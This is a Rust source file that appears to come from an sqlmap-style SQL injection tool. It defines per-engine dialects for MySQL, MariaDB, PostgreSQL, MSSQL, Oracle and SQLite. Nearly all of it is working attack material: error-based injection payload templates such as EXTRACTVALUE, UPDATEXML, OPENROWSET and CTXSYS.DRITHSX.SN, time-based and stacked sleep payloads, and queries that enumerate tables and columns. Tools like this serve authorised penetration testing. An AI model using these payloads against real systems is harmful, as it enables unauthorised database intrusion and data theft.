//! Dialect implementations for the five major DBMS engines + MariaDB.

use super::dialect::DbmsDialect;

// ── MySQL ─────────────────────────────────────────────────────────────────────

pub struct MySQL;
impl DbmsDialect for MySQL {
    fn name(&self) -> &'static str {
        "MySQL"
    }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[
            ("You have an error in your SQL syntax", "MySQL"),
            ("Warning: mysql_", "MySQL/PHP"),
            // XPATH errors from EXTRACTVALUE/UPDATEXML error-based injection
            ("XPATH syntax error", "MySQL/XPATH"),
        ]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        ["@@version", "user()", "database()"]
    }

    fn union_type_cast_wrappers(&self) -> Vec<&'static str> {
        vec!["CAST(%s AS CHAR)", "CONVERT(%s, CHAR)"]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!(
            "SELECT table_name FROM information_schema.tables \
             WHERE table_schema=database() LIMIT 1 OFFSET {}",
            index
        )
    }

    fn column_count_query(&self, table: &str) -> String {
        format!(
            "SELECT COUNT(*) FROM information_schema.columns \
             WHERE table_schema=database() AND table_name='{}'",
            table
        )
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT column_name FROM information_schema.columns \
             WHERE table_schema=database() AND table_name='{}' LIMIT 1 OFFSET {}",
            table, index
        )
    }

    fn sleep_function(&self, seconds: u64) -> String {
        format!("SLEEP({})", seconds)
    }

    fn conditional_sleep(&self, condition: &str, seconds: u64) -> String {
        format!("IF({}, SLEEP({}), 0)", condition, seconds)
    }

    fn stacked_sleep_payload(&self, original_value: &str, seconds: u64) -> String {
        format!("{}; SELECT SLEEP({})-- ", original_value, seconds)
    }

    /// MySQL error-based payloads: XPATH, DOUBLE, BIGINT, JSON, POINT, PROCEDURE ANALYSE
    fn error_based_payloads(&self) -> Vec<(&'static str, &'static str)> {
        vec![
            // XPATH errors (EXTRACTVALUE/UPDATEXML) - already in bundled payloads
            ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(%s),0x7e))-- ", "XPATH EXTRACTVALUE"),
            ("' AND UPDATEXML(1,CONCAT(0x7e,(%s),0x7e),1)-- ", "XPATH UPDATEXML"),
            // Double type conversion error
            ("' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((%s),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ", "DOUBLE injection"),
            // BIGINT overflow
            ("' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((%s),~(1<<63))x FROM information_schema.tables GROUP BY x)a)-- ", "BIGINT overflow"),
            // JSON error (MySQL 5.7+)
            ("' AND JSON_KEYS((SELECT CONVERT((%s) USING utf8)))-- ", "JSON keys error"),
            // POINT geometry error
            ("' AND (SELECT * FROM (SELECT * FROM(SELECT NAME_CONST((%s),1))a)JOIN(SELECT NAME_CONST((%s),1))b)c)-- ", "NAME_CONST error"),
            // PROCEDURE ANALYSE (legacy)
            ("' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,(%s),0x7e)),1)-- ", "PROCEDURE ANALYSE"),
        ]
    }
}

// ── MariaDB ───────────────────────────────────────────────────────────────────

pub struct MariaDB;
impl DbmsDialect for MariaDB {
    fn name(&self) -> &'static str {
        "MariaDB"
    }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[
            ("MariaDB server version", "MariaDB"),
            ("MariaDB", "MariaDB"),
            ("TiDB version", "TiDB"),
        ]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        ["@@version", "user()", "database()"]
    }

    fn union_type_cast_wrappers(&self) -> Vec<&'static str> {
        vec!["CAST(%s AS CHAR)", "CONVERT(%s, CHAR)"]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!(
            "SELECT table_name FROM information_schema.tables \
             WHERE table_schema=database() LIMIT 1 OFFSET {}",
            index
        )
    }

    fn column_count_query(&self, table: &str) -> String {
        format!(
            "SELECT COUNT(*) FROM information_schema.columns \
             WHERE table_schema=database() AND table_name='{}'",
            table
        )
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT column_name FROM information_schema.columns \
             WHERE table_schema=database() AND table_name='{}' LIMIT 1 OFFSET {}",
            table, index
        )
    }

    fn sleep_function(&self, seconds: u64) -> String {
        format!("SLEEP({})", seconds)
    }

    fn conditional_sleep(&self, condition: &str, seconds: u64) -> String {
        format!("IF({}, SLEEP({}), 0)", condition, seconds)
    }

    fn stacked_sleep_payload(&self, original_value: &str, seconds: u64) -> String {
        format!("{}; SELECT SLEEP({})-- ", original_value, seconds)
    }

    /// MariaDB inherits MySQL payloads
    fn error_based_payloads(&self) -> Vec<(&'static str, &'static str)> {
        vec![
            // XPATH errors
            ("' AND EXTRACTVALUE(1,CONCAT(0x7e,(%s),0x7e))-- ", "XPATH EXTRACTVALUE"),
            ("' AND UPDATEXML(1,CONCAT(0x7e,(%s),0x7e),1)-- ", "XPATH UPDATEXML"),
            // Double injection
            ("' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((%s),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ", "DOUBLE injection"),
            // REGEXP DoS error (MariaDB specific)
            ("' AND REGEXP_LIKE((%s),'[invalid')-- ", "REGEXP error"),
        ]
    }
}

// ── PostgreSQL ────────────────────────────────────────────────────────────────

pub struct PostgreSQL;
impl DbmsDialect for PostgreSQL {
    fn name(&self) -> &'static str {
        "PostgreSQL"
    }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[
            ("ERROR: syntax error at or near", "PostgreSQL"),
            ("ERROR: unterminated quoted string", "PostgreSQL"),
            ("LINE 1:", "PostgreSQL"),
            ("PostgreSQL query failed", "PostgreSQL"),
            ("at or near", "PostgreSQL"),
        ]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        ["version()", "current_user", "current_database()"]
    }

    fn union_type_cast_wrappers(&self) -> Vec<&'static str> {
        vec!["CAST(%s AS TEXT)", "(%s)::TEXT"]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public'".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!(
            "SELECT table_name FROM information_schema.tables \
             WHERE table_schema='public' LIMIT 1 OFFSET {}",
            index
        )
    }

    fn column_count_query(&self, table: &str) -> String {
        format!(
            "SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'",
            table
        )
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT column_name FROM information_schema.columns \
             WHERE table_name='{}' LIMIT 1 OFFSET {}",
            table, index
        )
    }

    fn sleep_function(&self, seconds: u64) -> String {
        // sqlmap style: returns a scalar value after sleeping
        // (SELECT 1 FROM pg_sleep(n)) returns 1 after n seconds
        format!("(SELECT 1 FROM pg_sleep({}))", seconds)
    }

    fn conditional_sleep(&self, condition: &str, seconds: u64) -> String {
        // sqlmap approach: use subquery form (SELECT x FROM pg_sleep(n))
        // which returns x after n seconds, avoiding boolean context issues
        format!(
            "(CASE WHEN {} THEN (SELECT 1 FROM pg_sleep({})) ELSE 1 END)",
            condition, seconds
        )
    }

    fn stacked_sleep_payload(&self, original_value: &str, seconds: u64) -> String {
        format!("{}'; SELECT pg_sleep({})-- ", original_value, seconds)
    }

    /// PostgreSQL: use sqlmap-style (SELECT 1 FROM pg_sleep(n)) with comparison
    fn time_based_payload(&self, seconds: u64) -> String {
        format!("' AND 1=(SELECT 1 FROM pg_sleep({}))-- ", seconds)
    }

    /// PostgreSQL error-based payloads: XMLENTITY, cast errors, INTO clause
    fn error_based_payloads(&self) -> Vec<(&'static str, &'static str)> {
        vec![
            // XMLENTITY error (extracts data via XML parsing error)
            ("' AND 1=CAST((%s) AS INTEGER)-- ", "CAST to INTEGER error"),
            ("' AND 1=CAST((%s) AS NUMERIC)-- ", "CAST to NUMERIC error"),
            // pg_sleep in cast context (time-based alternative)
            ("' AND (SELECT 1 FROM PG_SLEEP(CAST((%s) AS INTEGER)))-- ", "pg_sleep cast"),
            // String concatenation in array context
            ("' AND (SELECT * FROM (SELECT ARRAY_AGG((%s)) FROM pg_tables LIMIT 1 OFFSET 0)x)-- ", "ARRAY_AGG error"),
            // JSON error (PostgreSQL 9.3+)
            ("' AND (SELECT JSON_ARRAY_ELEMENTS((%s)))-- ", "JSON error"),
            // Generic type mismatch
            ("' AND (%s)::int=1-- ", "Type cast error"),
        ]
    }
}

// ── MSSQL ─────────────────────────────────────────────────────────────────────

pub struct Mssql;
impl DbmsDialect for Mssql {
    fn name(&self) -> &'static str {
        "MSSQL"
    }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[
            ("Microsoft OLE DB Provider for SQL Server", "MSSQL"),
            ("Incorrect syntax near", "MSSQL"),
            ("SQL Server Driver", "MSSQL"),
        ]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        ["@@version", "system_user", "db_name()"]
    }

    fn union_type_cast_wrappers(&self) -> Vec<&'static str> {
        vec!["CAST(%s AS VARCHAR)", "CONVERT(VARCHAR, %s)"]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM information_schema.tables".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!(
            "SELECT table_name FROM (\
             SELECT table_name, ROW_NUMBER() OVER (ORDER BY table_name) AS rn \
             FROM information_schema.tables) t WHERE rn={}",
            index + 1
        )
    }

    fn column_count_query(&self, table: &str) -> String {
        format!(
            "SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}'",
            table
        )
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT column_name FROM (\
             SELECT column_name, ROW_NUMBER() OVER (ORDER BY ordinal_position) AS rn \
             FROM information_schema.columns WHERE table_name='{}') t WHERE rn={}",
            table,
            index + 1
        )
    }

    fn sleep_function(&self, seconds: u64) -> String {
        format!("WAITFOR DELAY '00:00:{:02}'", seconds)
    }

    fn conditional_sleep(&self, condition: &str, seconds: u64) -> String {
        format!("IF ({}) WAITFOR DELAY '00:00:{:02}'", condition, seconds)
    }

    fn stacked_sleep_payload(&self, original_value: &str, seconds: u64) -> String {
        format!(
            "{}; WAITFOR DELAY '00:00:{:02}'-- ",
            original_value, seconds
        )
    }

    /// MSSQL: WAITFOR cannot be used after AND — use stacked-query style instead.
    fn time_based_payload(&self, seconds: u64) -> String {
        format!("'; WAITFOR DELAY '00:00:{:02}'-- ", seconds)
    }

    /// MSSQL error-based payloads: FOR XML PATH, OPENROWSET, CONVERT overflow
    fn error_based_payloads(&self) -> Vec<(&'static str, &'static str)> {
        vec![
            // FOR XML PATH error (forces error via XML conversion)
            ("' AND 1=(SELECT * FROM (SELECT (%s))x FOR XML PATH(''),TYPE)-- ", "FOR XML PATH"),
            // CONVERT overflow error
            ("' AND CONVERT(INT,(%s))=1-- ", "CONVERT overflow"),
            // CAST error variant
            ("' AND CAST((%s) AS INT)=1-- ", "CAST to INT error"),
            // OPENROWSET error chain (requires admin but useful)
            ("' AND 1=(SELECT * FROM OPENROWSET('SQLOLEDB','';'sa';'pwd',('SELECT 1;%s')))-- ", "OPENROWSET error"),
            // String concatenation error via recursive CTE
            ("' AND 1=(SELECT (%s) WHERE 1/0=0)-- ", "Division by zero error"),
            // Sybase/MSSQL specific via @@VERSION parsing
            ("' AND (%s) IN (SELECT * FROM master..sysdatabases)-- ", "IN clause type error"),
        ]
    }
}

// ── Oracle ────────────────────────────────────────────────────────────────────

pub struct Oracle;
impl DbmsDialect for Oracle {
    fn name(&self) -> &'static str {
        "Oracle"
    }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[("ORA-00933", "Oracle"), ("ORA-01756", "Oracle")]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        [
            "(SELECT banner FROM v$version WHERE rownum=1)",
            "user",
            "ora_database_name",
        ]
    }

    fn union_type_cast_wrappers(&self) -> Vec<&'static str> {
        vec!["TO_CHAR(%s)", "CAST(%s AS VARCHAR2(4000))"]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM user_tables".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!(
            "SELECT table_name FROM (\
             SELECT table_name, ROWNUM rn FROM user_tables) WHERE rn={}",
            index + 1
        )
    }

    fn column_count_query(&self, table: &str) -> String {
        format!(
            "SELECT COUNT(*) FROM user_tab_columns WHERE table_name='{}'",
            table.to_uppercase()
        )
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT column_name FROM (\
             SELECT column_name, ROWNUM rn FROM user_tab_columns WHERE table_name='{}') \
             WHERE rn={}",
            table.to_uppercase(),
            index + 1
        )
    }

    fn sleep_function(&self, seconds: u64) -> String {
        format!("DBMS_LOCK.SLEEP({})", seconds)
    }

    fn conditional_sleep(&self, condition: &str, seconds: u64) -> String {
        format!(
            "CASE WHEN {} THEN DBMS_LOCK.SLEEP({}) ELSE NULL END",
            condition, seconds
        )
    }

    // Oracle does not support stacked queries in standard form.
    fn stacked_sleep_payload(&self, _original_value: &str, _seconds: u64) -> String {
        String::new()
    }

    /// Oracle error-based payloads: CTXSYS.DRITHSX.SN, dbms_xmlgen, utl_inaddr
    fn error_based_payloads(&self) -> Vec<(&'static str, &'static str)> {
        vec![
            // CTXSYS.DRITHSX.SN (CTXSYS package error - classic Oracle technique)
            ("' AND 1=CTXSYS.DRITHSX.SN(1,(%s))-- ", "CTXSYS.DRITHSX.SN"),
            // DBMS_XMLGEN error (XML parsing error)
            ("' AND DBMS_XMLGEN.GETXMLTYPE('<%s>'||(%s)||'</x>').EXTRACT('//text()') IS NOT NULL-- ", "DBMS_XMLGEN"),
            // UTL_INADDR error (network errors can leak data)
            ("' AND UTL_INADDR.GET_HOST_NAME((%s)) IS NOT NULL-- ", "UTL_INADDR"),
            // CAST error via TO_CHAR
            ("' AND 1=CAST((%s) AS INT)-- ", "CAST to INT"),
            // XMLType error
            ("' AND XMLTYPE('<%s>'||(%s)||'</x>').EXTRACT('//text()') IS NOT NULL-- ", "XMLType error"),
            // ORA-01719 error via outer join
            ("' AND 1=(SELECT * FROM (SELECT (%s) FROM DUAL)WHERE ROWNUM=1)-- ", "Subselect ORA error"),
        ]
    }
}

// ── SQLite ────────────────────────────────────────────────────────────────────

pub struct Sqlite;
impl DbmsDialect for Sqlite {
    fn name(&self) -> &'static str {
        "SQLite"
    }

    fn error_signatures(&self) -> &[(&'static str, &'static str)] {
        &[
            ("near \"X\": syntax error", "SQLite"),
            ("SQLITE_ERROR", "SQLite"),
            // Note: SQLSTATE[HY000] and "General error: 1" are too generic
            // "General error: 1" matches MySQL "general error: 1366" as substring!
            // Use more specific SQLite patterns
            ("unrecognized token:", "SQLite"),
            ("syntax error", "SQLite"),
        ]
    }

    fn union_extraction_functions(&self) -> [&'static str; 3] {
        [
            "(SELECT sqlite_version())",
            "(SELECT 'sqlite_user')",
            "(SELECT 'main')",
        ]
    }

    fn union_type_cast_wrappers(&self) -> Vec<&'static str> {
        vec!["CAST(%s AS TEXT)"]
    }

    fn table_count_query(&self) -> String {
        "SELECT COUNT(*) FROM sqlite_master WHERE type='table'".into()
    }

    fn table_name_query(&self, index: usize) -> String {
        format!(
            "SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {}",
            index
        )
    }

    fn column_count_query(&self, table: &str) -> String {
        format!("SELECT COUNT(*) FROM pragma_table_info('{}')", table)
    }

    fn column_name_query(&self, table: &str, index: usize) -> String {
        format!(
            "SELECT name FROM pragma_table_info('{}') LIMIT 1 OFFSET {}",
            table, index
        )
    }

    fn char_code_function(&self) -> &'static str {
        "unicode"
    }
    fn substring_function(&self) -> &'static str {
        "substr"
    }

    fn sleep_function(&self, _seconds: u64) -> String {
        "randomblob(1000000000)".to_string()
    }

    fn conditional_sleep(&self, condition: &str, _seconds: u64) -> String {
        format!(
            "CASE WHEN {} THEN randomblob(1000000000) ELSE 0 END",
            condition
        )
    }

    /// SQLite error-based payloads (limited due to type system)
    fn error_based_payloads(&self) -> Vec<(&'static str, &'static str)> {
        vec![
            // CAST error
            ("' AND CAST((%s) AS BLOB)=1-- ", "CAST to BLOB error"),
            // JSON error (SQLite 3.38+)
            ("' AND JSON_TYPE((%s))-- ", "JSON type error"),
            // FTS5 error (if FTS5 enabled)
            ("' AND (SELECT * FROM fts5('%s'))-- ", "FTS5 error"),
        ]
    }

    // Stacked queries are not supported in standard SQLite.
}
